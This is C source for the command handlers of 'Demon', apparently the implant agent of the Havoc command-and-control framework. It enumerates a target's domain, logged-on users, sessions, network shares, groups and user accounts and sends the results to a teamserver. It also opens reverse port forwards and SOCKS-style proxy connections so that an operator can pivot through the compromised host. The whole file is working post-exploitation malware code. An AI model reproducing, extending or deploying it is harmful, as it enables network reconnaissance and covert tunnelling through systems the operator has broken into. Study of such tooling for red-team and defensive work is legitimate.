#include <Demon.h>

#include <common/Macros.h>

#include <core/Command.h>
#include <core/Token.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/SleepObf.h>
#include <core/Download.h>
#include <core/Dotnet.h>
#include <core/Kerberos.h>
#include <core/Runtime.h>
#include <core/CoffeeLdr.h>
#include <core/MemoryHide.h>
#include <inject/Inject.h>
#include <commands/Command_Net.h>

// TODO: The Net module is unstable so fix those issues to work on normal workstation and domain server
VOID CommandNet( PPARSER Parser )
{
    PUTS( "NET COMMAND" )
    PPACKAGE Package    = PackageCreate( DEMON_COMMAND_NET );
    UINT32   NetCommand = ParserGetInt32( Parser );

    PackageAddInt32( Package, NetCommand );

    switch ( NetCommand )
    {
        case DEMON_NET_COMMAND_DOMAIN:
        {
            PUTS( "DEMON_NET_COMMAND_DOMAIN" )

            LPSTR Domain = NULL;
            DWORD Length = 0;

            if ( ! Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
            {
                if ( ( Domain = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
                {
                    if ( ! Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, Domain, &Length ) )
                    {
                       PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                       goto DOMAIN_CLEANUP;
                    }
                }
                else
                    goto DOMAIN_CLEANUP;
            }
            else
                goto DOMAIN_CLEANUP;

            PackageAddString( Package, Domain );

            DATA_FREE( Domain, Length );

            break;

        DOMAIN_CLEANUP:
            DATA_FREE( Domain, Length );
            PackageDestroy( Package ); Package = NULL;
            return;
        }

        case DEMON_NET_COMMAND_LOGONS:
        {
            PUTS( "DEMON_NET_COMMAND_LOGONS" )

            LPWKSTA_USER_INFO_0 UserInfo        = NULL;
            DWORD               dwLevel         = 0;
            DWORD               dwEntriesRead   = 0;
            DWORD               dwTotalEntries  = 0;
            DWORD               dwResumeHandle  = 0;
            DWORD               NetStatus       = 0;
            UINT32              UserNameSize    = 0;
            LPWSTR              ServerName      = NULL;

            ServerName = ParserGetWString( Parser, &UserNameSize );

            PackageAddWString( Package, ServerName );

            UserNameSize = 0;
            do
            {
                NetStatus = Instance->Win32.NetWkstaUserEnum( ServerName, dwLevel, (LPBYTE*)&UserInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle );
                if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                {
                    for ( INT i = 0; ( i < dwEntriesRead ); i++ )
                    {
                        if ( UserInfo == NULL )
                            break;

                        PackageAddWString( Package, UserInfo[i].wkui0_username );
                    }
                }
                else
                {
                    NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NetStatus ) );

                    PRINTF( "NetWkstaUserEnum: Failed [%d]\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto CLEANUP;
                }

                if ( UserInfo )
                {
                    Instance->Win32.NetApiBufferFree( UserInfo );
                    UserInfo = NULL;
                }
            }
            while ( NetStatus == ERROR_MORE_DATA );

            if ( UserInfo != NULL )
                Instance->Win32.NetApiBufferFree( UserInfo );

            break;

        CLEANUP:
            if ( UserInfo != NULL )
                Instance->Win32.NetApiBufferFree( UserInfo );

            PackageDestroy( Package ); Package = NULL;
            return;
        }

        case DEMON_NET_COMMAND_SESSIONS:
        {
            PUTS( "DEMON_NET_COMMAND_SESSIONS" )

            LPSESSION_INFO_10 SessionInfo       = NULL;
            DWORD             EntriesRead       = 0;
            DWORD             TotalEntries      = 0;
            DWORD             ResumeHandle      = 0;
            LPWSTR            ServerName        = NULL;
            DWORD             NetStatus         = 0;
            UINT32            UserNameSize      = 0;

            ServerName = ParserGetWString( Parser, &UserNameSize );

            PackageAddWString( Package, ServerName );

            UserNameSize = 0;
            do
            {
                NetStatus = Instance->Win32.NetSessionEnum( ServerName, NULL, NULL, 10, (LPBYTE*)&SessionInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &ResumeHandle );

                if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                {
                    for ( INT i = 0; i < EntriesRead ; i++ )
                    {
                        if ( SessionInfo == NULL )
                            break;

                        PackageAddWString( Package, SessionInfo[i].sesi10_username );
                        PackageAddWString( Package, SessionInfo[i].sesi10_cname );
                        PackageAddInt32( Package, SessionInfo[i].sesi10_time );
                        PackageAddInt32( Package, SessionInfo[i].sesi10_idle_time );
                    }
                }
                else
                {
                    PRINTF( "NetSessionEnum: Failed [%d]\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto SESSION_CLEANUP;
                }

                if ( SessionInfo )
                {
                    Instance->Win32.NetApiBufferFree( SessionInfo );
                    SessionInfo = NULL;
                }
            }
            while ( NetStatus == ERROR_MORE_DATA );

            if ( SessionInfo )
                Instance->Win32.NetApiBufferFree( SessionInfo );

            break;

        SESSION_CLEANUP:
            if ( SessionInfo )
                Instance->Win32.NetApiBufferFree( SessionInfo );

            PackageDestroy( Package ); Package = NULL;
            return;
        }

        case DEMON_NET_COMMAND_COMPUTER:
        {
            PUTS( "DEMON_NET_COMMAND_COMPUTER" )

            break;
        }

        case DEMON_NET_COMMAND_DCLIST:
        {
            PUTS( "DEMON_NET_COMMAND_DCLIST" )
            break;
        }

        case DEMON_NET_COMMAND_SHARE:
        {
            PUTS( "DEMON_NET_COMMAND_SHARE" )

            PSHARE_INFO_502 ShareInfo    = NULL;
            DWORD           NetStatus    = 0;
            DWORD           Entries      = 0;
            DWORD           TotalEntries = 0;
            DWORD           Resume       = 0;
            LPWSTR          ServerName   = NULL;
            UINT32          ServerSize   = 0;

            ServerName = ParserGetWString( Parser, &ServerSize );
            PackageAddWString( Package, ServerName );
            do
            {
                NetStatus = Instance->Win32.NetShareEnum( ServerName, 502, (LPBYTE*)&ShareInfo, MAX_PREFERRED_LENGTH, &Entries, &TotalEntries, &Resume );
                if( ( NetStatus == ERROR_SUCCESS ) || ( NetStatus == ERROR_MORE_DATA ) )
                {

                    for( DWORD i = 0; i < Entries; i++ )
                    {
                        PRINTF( "%-5ls %-20ls %d %-20ls\n", ShareInfo[i].shi502_netname, ShareInfo[i].shi502_path, ShareInfo[i].shi502_permissions, ShareInfo[i].shi502_remark );

                        PackageAddWString( Package, ShareInfo[i].shi502_netname );
                        PackageAddWString( Package, ShareInfo[i].shi502_path );
                        PackageAddWString( Package, ShareInfo[i].shi502_remark );
                        PackageAddInt32( Package, ShareInfo[i].shi502_permissions );
                    }

                    Instance->Win32.NetApiBufferFree( ShareInfo );
                    ShareInfo = NULL;
                }
                else
                    PRINTF( "Error: %ld\n", NetStatus );
            }
            while ( NetStatus == ERROR_MORE_DATA );

            break;
        }

        case DEMON_NET_COMMAND_LOCALGROUP:
        {
            PUTS( "DEMON_NET_COMMAND_LOCALGROUP" )

            PLOCALGROUP_INFO_1  GroupInfo     = NULL;
            DWORD               EntriesRead   = 0;
            DWORD               TotalEntries  = 0;
            DWORD               NetStatus     = 0;
            LPWSTR              ServerName    = NULL;
            UINT32              ServerSize    = 0;

            ServerName = ParserGetWString( Parser, &ServerSize );
            PackageAddWString( Package, ServerName );

            PRINTF( "ServerName => %ls\n", ServerName );

            NetStatus = Instance->Win32.NetLocalGroupEnum( ServerName, 1, (LPBYTE*)&GroupInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, NULL );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                PUTS( "NetLocalGroupEnum => Success" )
                if ( GroupInfo )
                {
                    for( DWORD i = 0; i < EntriesRead; i++ )
                    {
                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_name );
                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_comment );
                    }

                    Instance->Win32.NetApiBufferFree( GroupInfo );
                    GroupInfo = NULL;
                }
            }

            break;
        }

        case DEMON_NET_COMMAND_GROUP:
        {
            PUTS( "DEMON_NET_COMMAND_GROUP" )

            PLOCALGROUP_INFO_1  GroupInfo     = NULL;
            DWORD               EntriesRead   = 0;
            DWORD               TotalEntries  = 0;
            DWORD               NetStatus     = 0;
            LPWSTR              ServerName    = NULL;
            UINT32              ServerSize    = 0;

            ServerName = ParserGetWString( Parser, &ServerSize );
            PackageAddWString( Package, ServerName );

            NetStatus = Instance->Win32.NetGroupEnum( ServerName, 1, (LPBYTE*)&GroupInfo, -1, &EntriesRead, &TotalEntries, NULL );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                if ( GroupInfo )
                {
                    for( DWORD i = 0;i < EntriesRead; i++ )
                    {
                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_name );
                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_comment );
                    }
                }

                Instance->Win32.NetApiBufferFree( GroupInfo );
                GroupInfo = NULL;
            }
            else
            {
                PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }

            if ( GroupInfo )
            {
                Instance->Win32.NetApiBufferFree( GroupInfo );
                GroupInfo = NULL;
            }

            break;
        }

        case DEMON_NET_COMMAND_USER:
        {
            PUTS( "DEMON_NET_COMMAND_USER" )

            LPUSER_INFO_0  UserInfo     = NULL;
            DWORD          NetStatus    = 0;
            DWORD          EntriesRead  = 0;
            DWORD          TotalEntries = 0;
            DWORD          Resume       = 0;
            LPWSTR         ServerName   = NULL;
            UINT32         ServerSize   = 0;

            ServerName = ParserGetWString( Parser, &ServerSize );
            PackageAddWString( Package, ServerName );

            NetStatus = Instance->Win32.NetUserEnum( ServerName, 0, 0, (LPBYTE*)&UserInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &Resume );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                for ( DWORD i = 0; i < EntriesRead; i++ )
                {
                    if ( UserInfo[ i ].usri0_name )
                    {
                        PackageAddWString( Package, UserInfo[ i ].usri0_name );
                        PackageAddInt32( Package, FALSE ); // TODO: fix this.
                    }
                }

                if ( UserInfo )
                {
                    Instance->Win32.NetApiBufferFree( UserInfo );
                    UserInfo = NULL;
                }
            }
            else
            {
                PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }

            break;
        }

        default:
        {
            PUTS( "COMMAND NOT FOUND" )
            break;
        }
    }

    PackageTransmit( Package );
}

VOID CommandSocket( PPARSER Parser )
{
    PPACKAGE     Package = NULL;
    PSOCKET_DATA Socket  = NULL;
    DWORD        Command = 0;

    Package = PackageCreate( DEMON_COMMAND_SOCKET );
    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );
    switch ( Command )
    {
        case SOCKET_COMMAND_RPORTFWD_ADD: PUTS( "Socket::RPortFwdAdd" )
        {
            DWORD LclAddr = 0;
            DWORD LclPort = 0;
            DWORD FwdAddr = 0;
            DWORD FwdPort = 0;

            // TODO: add support for IPv6

            /* Parse Host and Port to bind to */
            LclAddr = ParserGetInt32( Parser );
            LclPort = ParserGetInt32( Parser );

            /* Parse Host and Port to forward port to */
            FwdAddr = ParserGetInt32( Parser );
            FwdPort = ParserGetInt32( Parser );

            /* Create a reverse port forward socket and insert it into the linked list. */
            Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PORTFWD, TRUE, LclAddr, NULL, LclPort, FwdAddr, FwdPort, 0 );

            /* if Socket is not NULL then we managed to start a socket. */
            PackageAddInt32( Package, Socket ? TRUE : FALSE );
            PackageAddInt32( Package, Socket ? Socket->ID : 0 );

            /* Add our Bind Host & Port data */
            PackageAddInt32( Package, LclAddr );
            PackageAddInt32( Package, LclPort );

            /* Add our Forward Host & Port data */
            PackageAddInt32( Package, FwdAddr );
            PackageAddInt32( Package, FwdPort );

            break;
        }

        case SOCKET_COMMAND_RPORTFWD_LIST: PUTS( "Socket::RPortFwdList" )
        {
            Socket = Instance->Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->ShouldRemove ) {
                    Socket = Socket->Next;
                    continue;
                }

                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
                {
                    PackageAddInt32( Package, Socket->ID );

                    /* Add our Bind Host & Port data */
                    PackageAddInt32( Package, Socket->IPv4 );
                    PackageAddInt32( Package, Socket->LclPort );

                    /* Add our Forward Host & Port data */
                    PackageAddInt32( Package, Socket->FwdAddr );
                    PackageAddInt32( Package, Socket->FwdPort );
                }

                Socket = Socket->Next;
            }

            break;
        }

        case SOCKET_COMMAND_RPORTFWD_REMOVE: PUTS( "Socket::RPortFwdRemove" )
        {
            DWORD SocketID = 0;

            SocketID = ParserGetInt32( Parser );
            Socket   = Instance->Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD && Socket->ID == SocketID )
                {
                    Socket->ShouldRemove = TRUE;
                }
                else if ( Socket->Type == SOCKET_TYPE_CLIENT && Socket->ParentID == SocketID )
                {
                    Socket->ShouldRemove = TRUE;
                }

                Socket = Socket->Next;
            }

            /* we don't want to send the message now.
             * send it while we are free and closing the socket. */
            PackageDestroy( Package ); Package = NULL;

            return;
        }

        case SOCKET_COMMAND_RPORTFWD_CLEAR: PUTS( "Socket::RPortFwdClear" )
        {
            Socket = Instance->Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD || Socket->Type == SOCKET_TYPE_CLIENT )
                    Socket->ShouldRemove = TRUE;

                Socket = Socket->Next;
            }

            /* we don't want to send the message now.
             * send it while we are free and closing the sockets. */
            PackageDestroy( Package ); Package = NULL;
            return;
        }

        case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )
        {
            /* TODO: implement */

            break;
        }

        case SOCKET_COMMAND_WRITE: PUTS( "Socket::Write" )
        {
            DWORD  SocketID = 0;
            BUFFER Data     = { 0 };
            BOOL   Success  = FALSE;
            DWORD  Type     = SOCKET_TYPE_NONE;

            /* Parse arguments */
            SocketID    = ParserGetInt32( Parser );
            Data.Buffer = ParserGetBytes( Parser, &Data.Length );

            /* get Sockets list */
            Socket = Instance->Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                {
                    PRINTF( "Could not find socket: %x\n", SocketID )
                    break;
                }

                if ( Socket->ShouldRemove ) {
                    Socket = Socket->Next;
                    continue;
                }

                if ( Socket->ID == SocketID )
                {
                    Type = Socket->Type;

                    /* write the data to the socket */
                    if ( Instance->Win32.send( Socket->Socket, Data.Buffer, Data.Length, 0 ) != SOCKET_ERROR )
                    {
                        PRINTF( "Sent 0x%x bytes to Socket %x\n", Data.Length, SocketID )
                        Success = TRUE;
                    }
                    else
                    {
                        PRINTF( "Sending 0x%x bytes to Socket %x failed with %d\n", Data.Length, SocketID, Instance->Win32.WSAGetLastError() );
                    }

                    break;
                }

                Socket = Socket->Next;
            }

            if ( Success )
            {
                /* destroy the package and exit this command function */
                PackageDestroy( Package ); Package = NULL;
                return;
            }
            else
            {
                /* report the error to the teamserver */
                PackageAddInt32( Package, SocketID );
                PackageAddInt32( Package, Type );
                PackageAddInt32( Package, FALSE );
                PackageAddInt32( Package, Instance->Win32.WSAGetLastError() );
            }
            break;
        }

        case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
        {
            DWORD  ScId       = 0;
            BYTE   ATYP       = 0;
            UINT32 HostIpSize = 0;
            PBYTE  HostIp     = NULL;
            BOOL   UseIpv4    = TRUE;
            DWORD  IPv4       = 0;
            PBYTE  IPv6       = NULL;
            INT16  Port       = 0;
            LPSTR  Domain     = NULL;
            UINT32 ErrorCode  = 0;

            /* parse arguments */
            ScId   = ParserGetInt32( Parser );
            ATYP   = ParserGetByte( Parser );
            HostIp = ParserGetBytes( Parser, &HostIpSize );
            Port   = ParserGetInt16( Parser );

            if ( ATYP == 1 )
            {
                // IPv4
                IPv4  = 0;
                IPv4 |= ( HostIp[0] << ( 8 * 0 ));
                IPv4 |= ( HostIp[1] << ( 8 * 1 ));
                IPv4 |= ( HostIp[2] << ( 8 * 2 ));
                IPv4 |= ( HostIp[3] << ( 8 * 3 ));
            }
            else if ( ATYP == 3 )
            {
                // DOMAINNAME

                // make sure there is a nullbyte at the end of the domain
                Domain = Instance->Win32.LocalAlloc( LPTR, HostIpSize + 1 );
                MemCopy( Domain, HostIp, HostIpSize );

                IPv4 = DnsQueryIPv4( (LPSTR)Domain );

                // if the domain does not have an IPv4, try with IPv6
                if ( ! IPv4 )
                {
                    IPv6    = DnsQueryIPv6( (LPSTR)Domain );
                    UseIpv4 = FALSE;
                }

                Instance->Win32.LocalFree( Domain );
            }
            else if ( ATYP == 4 )
            {
                // IPv6
                IPv6    = Instance->Win32.LocalAlloc( LPTR, 16 );
                MemCopy( IPv6, HostIp, 16 );
                UseIpv4 = FALSE;
            }

            PRINTF( "Socket ID: %x\n", ScId )

            /* check if address is not 0 */
            if ( IPv4 || IPv6 )
            {
                /* Create a socks proxy socket and insert it into the linked list. */
                if ( ( Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PROXY, UseIpv4, IPv4, IPv6, Port, 0, 0, 0 ) ) )
                {
                    Socket->ID = ScId;
                    ErrorCode = 0;
                }
                else
                {
                    ErrorCode = NtGetLastError();
                    PRINTF( "Connect failed with %d\n", ErrorCode )
                }

                PackageAddInt32( Package, Socket ? TRUE : FALSE );
            }
            else
            {
                PRINTF( "Could not resolve domain: %s\n", Domain );
                // error code for "Host unreachable"
                ErrorCode = WSAEHOSTUNREACH;
                PackageAddInt32( Package, FALSE );
            }

            PackageAddInt32( Package, ScId );
            PackageAddInt32( Package, ErrorCode );

            if ( IPv6 )
            {
                Instance->Win32.LocalFree( IPv6 );
                IPv6 = NULL;
            }

            break;
        }

        case SOCKET_COMMAND_CLOSE: PUTS( "Socket::Close" )
        {
            DWORD SocketID = 0;

            /* parse arguments */
            SocketID = ParserGetInt32( Parser );

            PRINTF( "SocketID: %x\n", SocketID );

            /* get Sockets list */
            Socket = Instance->Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->ID == SocketID )
                {
                    PRINTF( "Found socket: %x\n", Socket->ID )

                    Socket->ShouldRemove = TRUE;

                    break;
                }

                Socket = Socket->Next;
            }

            /* destroy the package and exit this command function */
            PackageDestroy( Package ); Package = NULL;

            return;
        }

        default: break;
    }

    PackageTransmit( Package );
}
